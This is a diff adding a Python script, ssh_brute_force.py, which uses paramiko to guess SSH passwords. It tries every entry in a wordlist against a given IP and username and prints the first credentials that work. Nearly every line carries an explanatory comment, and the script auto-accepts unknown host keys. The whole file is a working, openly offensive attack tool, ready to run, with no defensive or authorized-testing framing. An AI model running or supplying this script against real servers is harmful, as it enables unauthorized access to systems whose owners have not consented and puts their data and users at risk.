@@ -1,0 +1,37 @@
+import paramiko  # Imports the paramiko library, which is used to connect to the SSH server.
+import sys  # Imports the sys library, which provides access to variables and functions that interact with the Python runtime environment.
+
+def ssh_brute_force(ip, username, wordlist):
+    ssh = paramiko.SSHClient()  # Creates a new instance of the SSH client.
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Sets the policy to automatically accept unknown host keys.
+
+    with open(wordlist, 'r') as file:  # Opens the password list file in read mode.
+        passwords = file.readlines()  # Reads all lines from the password list file and stores them in a list called passwords.
+
+    for password in passwords:  # Starts a loop that iterates over each password in the passwords list.
+        password = password.strip()  # Strips any leading and trailing whitespace from the password.
+        try:
+            ssh.connect(ip, username=username, password=password)  # Attempts to connect to the SSH server using the IP, username, and current password.
+            print(f'Success! Username: {username} Password: {password}')  # If the connection is successful, prints a success message with the username and password.
+            return True  # Returns True to indicate that the correct password was found.
+        except paramiko.AuthenticationException:  # Catches authentication failure exceptions.
+            print(f'Failed login with password: {password}')  # Prints a message indicating that the login attempt failed with the current password.
+        except paramiko.SSHException as sshException:  # Catches other SSH-related exceptions.
+            print(f'Error connecting to the server: {sshException}')  # Prints a message indicating an error connecting to the server.
+            break  # Exits the loop if there is an SSH connection error.
+        except Exception as e:  # Catches any other unexpected exceptions.
+            print(f'Unexpected error: {e}')  # Prints a message indicating an unexpected error.
+            break  # Exits the loop if there is an unexpected error.
+    return False  # If no password works, returns False indicating that the brute force attempt failed.
+
+if __name__ == "__main__":  # Checks if the script is being run directly (and not imported as a module).
+    if len(sys.argv) != 4:  # Checks if the number of arguments passed to the script is exactly 4 (script name, IP, username, and password list).
+        print("Usage: python ssh_brute_force.py <IP> <USERNAME> <WORDLIST>")  # If the number of arguments is incorrect, prints a usage message.
+        sys.exit(1)  # Exits the script with a status code of 1, indicating an error.
+
+    ip = sys.argv[1]  # Gets the server's IP address from the command-line arguments.
+    username = sys.argv[2]  # Gets the username from the command-line arguments.
+    wordlist = sys.argv[3]  # Gets the path to the password list from the command-line arguments.
+
+    if not ssh_brute_force(ip, username, wordlist):  # Calls the ssh_brute_force function with the provided arguments. If the function returns False:
+        print("Brute force attack failed. No valid credentials found.")  # Prints a message indicating that the brute force attack failed and no valid credentials were found.
